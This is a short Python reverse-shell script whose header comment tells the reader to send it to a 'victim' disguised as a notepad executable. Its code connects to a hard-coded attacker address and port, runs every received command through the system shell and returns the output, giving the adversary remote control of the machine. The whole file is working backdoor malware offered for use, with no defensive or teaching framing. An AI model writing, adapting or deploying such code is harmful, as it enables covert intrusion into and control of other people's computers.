# send this file to victim through any way conert to exe file a notepad executable to form connection between adversary and victim
#!/usr/bin/env python



import socket

import subprocess



def exec_sys_cmd(cmd):

    return subprocess.check_output(cmd, shell=True)



# create instance

# arguments are address families

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# to connect  IP and port to connect to

# connect take tuple thus 2 brackets

connection.connect(("192.168.1.8", 4444)) # IP and port to connect with/ adversary own IP here

# to send

connection.send("\n[+]Connection established.\n")

# to recieve

while True:

    cmd=connection.recv(1024)

    cmd_rslt=exec_sys_cmd(cmd)

    connection.send(cmd_rslt)

# to close connection

connection.close()
